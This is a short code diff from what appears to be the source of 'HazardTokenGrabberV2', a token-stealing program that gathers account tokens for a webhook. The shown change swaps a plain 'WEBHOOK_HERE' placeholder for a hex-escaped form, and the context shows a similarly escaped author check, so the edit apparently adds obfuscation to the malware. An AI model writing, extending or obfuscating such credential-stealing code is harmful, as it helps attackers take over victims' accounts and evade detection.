@@ -208,7 +208,7 @@ class HazardTokenGrabberV2(Functions):
             self.tokens.append(tkn)
 
     async def init(self):
-        if self.webhook == "" or self.webhook == "WEBHOOK_HERE":
+        if self.webhook == "" or self.webhook == "\x57EBHOOK_HERE":
             self.hazard_exit()
 
         if __author__ != "\x52\x64\x69\x6d\x6f":
